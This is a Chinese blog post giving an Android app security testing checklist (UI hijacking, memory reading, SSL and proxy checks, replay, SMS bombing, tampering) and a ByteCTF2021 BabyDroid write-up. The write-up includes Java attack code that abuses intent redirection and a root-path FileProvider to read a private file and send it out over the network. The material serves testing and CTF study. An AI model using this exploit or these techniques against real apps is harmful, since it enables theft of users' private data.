<h3 id="界面切换保护">界面切换保护</h3>
<p>检查客户端程序在切换到其他应用时，已经填写的账号密码等敏感信息是否会清空，防止用户敏感信息泄露。如果切换前处于已登录状态，切换后一定时间内是否会自动退出当前会话。</p>
<p><strong>测试步骤</strong></p>
<p>人工检测。在登录界面（或者转账界面等涉及密码的功能）填写登录名和密码，然后切出，再进入客户端，看输入的登录名和密码是否清除。登录后切出，5 分钟内自动退出为安全</p>
<h3 id="UI信息泄露">UI信息泄露</h3>
<p>检查客户端的各种功能，看是否存在敏感信息泄露问题。</p>
<p>人工测试。使用错误的登录名或密码登录，看客户端提示是否不同。在显示卡号等敏感信息时是否进行部分遮挡。</p>
<h3 id="验证码安全">验证码安全</h3>
<p>测试客户端在登录和交易时是否使用图形验证码。验证码是否符合如下要求：由数字和字母等字符混合组成；采取图片底纹干扰、颜色变换、设置非连续性及旋转图片字体、变异字体显示样式等有效方式，防范恶意代码自动识别图片上的信息；具有使用时间限制并仅能使用一次；验证码由服务器生成，客户端文件中不包含图形验证码文本内容。</p>
<h3 id="安全退出">安全退出</h3>
<p>测试客户端退出时是否正常终止会话。</p>
<p>检查客户端在退出时，是否向服务端发送终止会话请求。客户端退出后，还能否使用退出前的会话 id 访问登录后才能访问的页面</p>
<h3 id="密码修改验证">密码修改验证</h3>
<p>测试客户端在修改密码时是否验证旧密码正确性。</p>
<p>人工测试。</p>
<h3 id="Activity-界面劫持"><strong>Activity 界面劫持</strong></h3>
<p>检查是否存在 activity 劫持风险，确认客户端是否能够发现并提示用户存在劫持。</p>
<p>安装 HijackActivity.apk，使用 activity 界面劫持工具，在工具中指定要劫持的应用进程名称。如图所示，从列表中选择被测试的应用，点击 OK。打开应用，测试工具会尝试用自己的窗口覆盖被测的应用</p>
<h2 id="进程保护">进程保护</h2>
<h3 id="内存访问和修改"><strong>内存访问和修改</strong></h3>
<p>通过对客户端内存的访问，木马将有可能会得到保存在内存中的敏感信息（如登录密码，帐号等）。测试客户端内存中是否存在的敏感信息（账号、明文密码等等）。</p>
<p>需要 root 权限，可以使用 MemSpector 查看、搜索和修改客户端内存数据，如图所示。用户名、密码等数据通常会在/dev/ashmem/dalvik-heap 内存段。（目前大多数工具都是通过 ptrace 接口修改客户端内存，可以使用 ptrace 机制本身防护。）</p>
<h3 id="动态注入"><strong>动态注入</strong></h3>
<p>通过注入动态链接库，hook 客户端某些关键函数，从而获取敏感信息或者改变程序执行。</p>
<h2 id="通信安全">通信安全</h2>
<p>如果客户端与服务器之间的通信加密协议实现不当，攻击者将有机会对当前网络环境中其他合法用户的通信内容进行窃听甚至篡改。</p>
<h3 id="证书有效性"><strong>证书有效性</strong></h3>
<p>主要测试 SSL 协议安全性、SSL 证书验证等</p>
<p>首先测试客户端程序是否严格检查服务器端证书信息。通过修改 DNS，将客户端链接到的主页地址改为 <a target="_blank" rel="noopener" href="https://mail.qq.com/%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%98%AF%E5%90%A6%E4%BC%9A%E6%8F%90%E7%A4%BA%E8%BF%9E%E6%8E%A5%E9%94%99%E8%AF%AF%E3%80%82%E6%AD%A4%E9%A1%B9%E6%B5%8B%E8%AF%95%E4%B8%BB%E8%A6%81%E9%92%88%E5%AF%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%98%AF%E5%90%A6%E5%AF%B9">https://mail.qq.com/，然后使用客户端访问服务端，查看客户端是否会提示连接错误。此项测试主要针对客户端是否对</a> SSL 证书中的域名进行确认。</p>
<p>也可以查阅代码中是否有 SSL 验证。下图是 Java 中进行服务端 SSL 证书验证的一种方式。关键函数为：java.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier()，通过此函数查找 HostnameVerifier 的 verify 函数。如 verify()函数总返回 true，则客户端对服务端 SSL 证书无验证。（可能还有其他 SSL 实现，需要验证）。</p>
<p><strong>安全建议</strong></p>
<p>使用 Https 方式进行加密，且服务器通过白名单方式验证客户端证书。</p>
<h3 id="关键数据加密和校检"><strong>关键数据加密和校检</strong></h3>
<p>测试客户端程序提交数据给服务端时，密码、收款人信息等关键字段是否进行了加密，防止恶意用户嗅探到用户数据包中的密码等敏感信息。</p>
<p>在手机上配置好代理，观察客户端和服务端的交互数据。检查关键字端是否加密。如果客户端对根证书进行了严格检测，导致代理无法使用。则可以将代理的根证书安装到设备上，使根证书可信。或是替换客户端 apk 中的根证书文件。如果上述方法均失效，则反编译为 java 代码，将客户端逆向后，通过阅读 java 代码的方式寻找客户端程序向服务端提交数据的代码，检查是否存在加密的代码。</p>
<h3 id="访问控制"><strong>访问控制</strong></h3>
<p>测试客户端访问的 URL 是否仅能由手机客户端访问。是否可以绕过登录限制直接访问登录后才能访问的页面，对需要二次验证的页面（如私密问题验证），能否绕过验证。</p>
<p>人工测试。在 PC 机的浏览器里输入 URL，尝试访问手机页面</p>
<h3 id="客户端更新安全性"><strong>客户端更新安全性</strong></h3>
<p>测试客户端自动更新机制是否安全。如果客户端更新没有使用官方应用商店的更新方式，就可能导致用户下载并安装恶意应用，从而引入安全风险。</p>
<p>使用代理抓取检测更新的数据包，尝试将服务器返回的更新 url 替换为恶意链接。看客户端是否会直接打开此链接并下载应用。在应用下载完毕后，测试能否替换下载的 apk 文件，测试客户端是否会安装替换后的应用。</p>
<h3 id="短信重放攻击"><strong>短信重放攻击</strong></h3>
<p>检测应用中是否存在数据包重放攻击的安全问题。是否会对客户端用户造成短信轰炸的困扰</p>
<p>尝试重放短信验证码数据包是否可以进行短信轰炸攻击</p>
<h2 id="业务安全">业务安全</h2>
<h3 id="越权">越权</h3>
<p>服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致攻击账号拥有了其他账户的增删改查功能。</p>
<p>手工测试</p>
<h3 id="交易篡改"><strong>交易篡改</strong></h3>
<p>本项测试主要是修改金额信息（如：转帐金额为负值），订单信息（如：订单的数量）等</p>
<p>手工抓包测试。</p>
<p>服务端要做到严格的验证。（根据业务情形不同，安全建议也不相同，因此这里只能简单的一句话描述）</p>
<h3 id="重放攻击">重放攻击</h3>
<p>主要就是进行抓包重放（如：重放产品购买、订单创造等）测试。</p>
<p>人工测试</p>
<h3 id="用户枚举">用户枚举</h3>
<p>尝试爆破枚举用户。</p>
<p>手工测试。</p>
<p>此类漏洞情境一般是：登录界面无验证码、有明显的返回信息（如：该账号不存在、密码错误等）</p>
<h3 id="暴力破解">暴力破解</h3>
<p>主要是测试业务中查询、登录等功能，尝试使用暴力枚举的方式进行破解</p>
<p>手工测试</p>
<h3 id="注入-XSS-CSRF"><strong>注入/XSS/CSRF</strong></h3>
<p>和 WEB 测试类似，主要测试站点存在的常见的 web 漏洞</p>
<p>可手工测试也可以使用工具扫描、测试</p>
<h1>漏洞的一些分析 ByteCTF2021</h1>
<p><a target="_blank" rel="noopener" href="https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg">https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/">https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/7/#%3Cstrong%3EHardDroid%3C%2Fstrong%3E">https://blog.wm-team.cn/index.php/archives/7/#&lt;strong&gt;HardDroid&lt;%2Fstrong&gt;</a></p>
<h2 id="BabyDroid">BabyDroid</h2>
<h3 id="考点："><strong>考点</strong>：</h3>
<ul>
<li>Intent重定向</li>
<li>Grant Uri Permission 通过fileprovider任意读写</li>
</ul>
<p>对于<code>题目部署和运行环境</code>没有太过研究，主要是对漏洞加深理解，学习一下思路</p>
<h3 id="apk分析">apk分析</h3>
<p><strong>Manifest.xml</strong></p>
<p>对于这道题看一下Vulnerable.apk的清单文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241009194758416.png" alt="image-20241009194758416"></p>
<p>主要是上面红框内容：2个Activity，一个Receiver，一个provider。</p>
<p><strong>MainActivity</strong></p>
<p>主要就是加载布局</p>
<p><strong>Vulnerable</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241009195133582.png" alt="image-20241009195133582"></p>
<p>获取反序列化 <code>key</code>值为<code>intent</code>的数据，然后启动Intent</p>
<p><strong>FlagReceiver</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241009195413623.png" alt="image-20241009195413623"></p>
<p>创建一个 /data/data/Package_name/files/flag文件，并且把key值为flag获取的数据存放在创建的路径文件下，这里应该就是flag关键。</p>
<p><strong>Provider</strong></p>
<p><code>FileProvider</code>是<code>ContentProvider</code>的一个子类，使用content://代替file://，使得共享数据安全。</p>
<p>content URI允许临时授予该文件读写权限，只需要当创建一个包含该文件的content URI的时候，可以通过<code>Intent.setFlags()</code>添加相应的权限。</p>
<p>当创建FileProvider的时候，需要一个xml文件指定该provider提供的文件，如<code>res/xml/file_paths.xml</code>，其中提供了相应的映射路径和别名，</p>
<p>同时需要在AndroidManifest.xml中的FileProvider对应的节点内定义<code> &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot; &gt;</code>来声明。（其中resource属性内为提供的xml文件）</p>
<p>该Vulnerable.apk指定的xml文件内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>&lt;root-path&gt;</code>节点：代表设备的根目录</p>
<ul>
<li>
<p><code>name</code>属性：给该目录起的别名，用于隐藏路径</p>
</li>
<li>
<p><code>path</code>属性：临时授权访问的路径（该目录下的子目录）</p>
</li>
</ul>
<p>则该APK提供的FileProvider提供了根目录，通过<code>root/</code>别名来访问</p>
<p>则如果我们想访问flag的存储路径，实际构造的部分uri应为<code>root/data/data/[package_name]/files/flag</code>。</p>
<h3 id="利用思路">利用思路</h3>
<p>主要就是通过<code>FileProvider</code>获得这个<code>files/flag</code>文件的内容，但是他是不可导出的，发现他有一个<code>grantUriPermissions=&quot;true&quot;</code>所以可以利用这个访问content uri内容。</p>
<p>在Attack.apk中构造Intent访问content uri内容，然后利用Vnlnerable.class启动这个intent</p>
<p>其中构造的URL：</p>
<p><code>content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</code></p>
<h3 id="Attack实现">Attack实现</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getFlag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 判断一下是否是被目标apk来start的该Activity</span></span><br><span class="line">    <span class="keyword">if</span> (getIntent().getAction().equals(<span class="string">&quot;evil&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 获取接收到的uri</span></span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义一个字符输入流</span></span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(getContentResolver().openInputStream(data));</span><br><span class="line">            <span class="type">char</span>[] buf = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != isr.read(buf, <span class="number">0</span>, <span class="number">1024</span>)) &#123;</span><br><span class="line">                sb.append(String.valueOf(buf));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 读取的内容输入存储到flag</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(sb);</span><br><span class="line">            Log.d(<span class="string">&quot;PwnPwn&quot;</span>, flag);</span><br><span class="line">            ((TextView) findViewById(R.id.tv_show)).setText(<span class="keyword">new</span> <span class="title class_">String</span>(sb));</span><br><span class="line">            <span class="comment">// 通过网络、将信息传输回来获取</span></span><br><span class="line">            sendData(<span class="string">&quot;getFlag&quot;</span>,flag);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个action为&quot;evil&quot;的Intent</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">// 设定目的组件为当前MainActivity，也可以单独放在另一个AttackActivity中</span></span><br><span class="line">        evil.setClassName(getPackageName(), MainActivity.class.getName());</span><br><span class="line">        <span class="comment">// 设置操纵data数据为 flag所在文件的contentURI</span></span><br><span class="line">        evil.setData(Uri.parse(pwnUri));</span><br><span class="line">        <span class="comment">// 添加读写权限</span></span><br><span class="line">        evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建一个intent，用于启动目标APK</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="comment">// 启动的目标Activity为Vulnerable</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">        <span class="comment">// 同时将构造好的evil Intent当作 key &quot;intent&quot;的数据包装进去</span></span><br><span class="line">        intent.putExtra(<span class="string">&quot;intent&quot;</span>, evil);</span><br><span class="line">        <span class="comment">// 启动目标apk</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>App安全分析指南</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://zxk1ng.github.io/posts/f416437f.html">https://zxk1ng.github.io/posts/f416437f.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>zxk1ng</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2025-01-15</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2025-01-15</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Android%E5%AE%89%E5%85%A8/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>Android安全</a><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>安全测试</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>漏洞</a></div></div><link rel="stylesheet" href="/css/coin.css" media="defer" onload="this.media='all'"/><div class="post-reward"><button class="tip-button reward-button"><span class="tip-button__text">投喂作者</span><div class="coin-wrapper"><div class="coin"><div class="coin__middle"></div><div class="coin__back"></div><div class="coin__front"></div></div></div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat_reward.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wechat_reward.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zfb_reward.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zfb_reward.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></button></div><audio id="coinAudio" src="https://npm.elemecdn.com/akilar-candyassets@1.0.36/audio/aowu.m4a"></audio><script defer="defer" src="/js/coin.js"></script><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/e65d2ab6.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" onerror="onerror=null;src='/assets/r2.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">刷机与脱壳机入门</div></div></a></div><div class="next-post pull-right"><a href="/posts/69766bbb.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" onerror="onerror=null;src='/assets/r2.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">《第一行代码》阅读笔记</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><svg class="meta_icon" style="width:22px;height:22px;position:relative;top:5px"><use xlink:href="#icon-mulu1"></use></svg><span style="font-weight:bold">目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">APP安全分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#manifest%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B"><span class="toc-text">manifest文件检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PermissionGroup%E6%A3%80%E6%B5%8B"><span class="toc-text">PermissionGroup检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest%E6%96%87%E4%BB%B6%E4%B8%AD%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E4%BD%BF%E7%94%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifest文件中系统权限使用检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest%E5%8D%B1%E9%99%A9ProtectionLevel%E6%9D%83%E9%99%90%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifest危险ProtectionLevel权限检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest-sharedUserId-%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifest sharedUserId 检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest-allowBackup%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifest allowBackup检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest-Debuggable%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifest Debuggable检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%BF%85%E8%A6%81%E6%9D%83%E9%99%90%E6%A3%80%E6%B5%8B"><span class="toc-text">非必要权限检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#app%E6%9C%80%E4%BD%8E%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5"><span class="toc-text">app最低版本检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">组件安全检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Activity%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E6%A3%80%E6%B5%8B"><span class="toc-text">Activity组件导出检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#service%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E6%A3%80%E6%B5%8B"><span class="toc-text">service组件导出检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Receiver%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E6%A3%80%E6%B5%8B"><span class="toc-text">Receiver组件导出检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Provider%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E6%A3%80%E6%B5%8B"><span class="toc-text">Provider组件导出检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContentProvider%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">ContentProvider目录遍历漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Provider%EF%BC%9Agrant-uri-permission%E5%B1%9E%E6%80%A7%E6%A3%80%E6%B5%8B"><span class="toc-text">Provider：grant-uri-permission属性检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intent-Based%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B"><span class="toc-text">Intent-Based攻击检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intent-Scheme-URL%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="toc-text">Intent Scheme URL漏洞攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E6%9C%AC%E5%9C%B0%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">应用本地拒绝服务漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#manifest%E4%B8%AD%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E4%B8%BA%E5%AE%9E%E7%8E%B0%E6%A3%80%E6%B5%8B"><span class="toc-text">manifest中定义组件为实现检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug%E6%88%96Test%E6%95%8F%E6%84%9F%E6%B5%8B%E8%AF%95%E7%BB%84%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%A3%80%E6%B5%8B"><span class="toc-text">Debug或Test敏感测试组件泄露检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intent%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8F%8D%E5%B0%84%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">Intent不安全反射风险检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebView%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-text">WebView组件安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLite%E5%AE%89%E5%85%A8"><span class="toc-text">SQLite安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8"><span class="toc-text">网络通信安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL%E8%BF%9E%E6%8E%A5%E6%A3%80%E6%B5%8B"><span class="toc-text">SSL连接检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL%E4%B8%8D%E5%AE%89%E5%85%A8%E7%BB%84%E4%BB%B6%E6%A3%80%E6%B5%8B"><span class="toc-text">SSL不安全组件检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpHost%E6%A3%80%E6%B5%8B"><span class="toc-text">HttpHost检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpURLConnection%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">HttpURLConnection漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B"><span class="toc-text">网络端口开放威胁检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8A%A0%E5%AF%86%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">弱加密风险检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DES%E5%BC%B1%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">DES弱加密算法风险检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E9%92%A5%E9%95%BF%E5%BA%A6%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">不安全的密钥长度风险检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES-ECB%E5%BC%B1%E5%8A%A0%E5%AF%86%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">AES-ECB弱加密风险检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IVParameterSpec%E4%B8%8D%E5%AE%89%E5%85%A8%E5%88%9D%E5%A7%8B%E5%8C%96%E5%90%91%E9%87%8F%E6%A3%80%E6%B5%8B"><span class="toc-text">IVParameterSpec不安全初始化向量检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA%E4%B8%AD%E4%B8%8D%E4%BD%BF%E7%94%A8Padding%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">RSA中不使用Padding风险检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeyStore%E5%BC%B1%E5%AF%86%E7%A0%81%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">KeyStore弱密码风险检测</span></a></li></ol></li><li class="toc-item 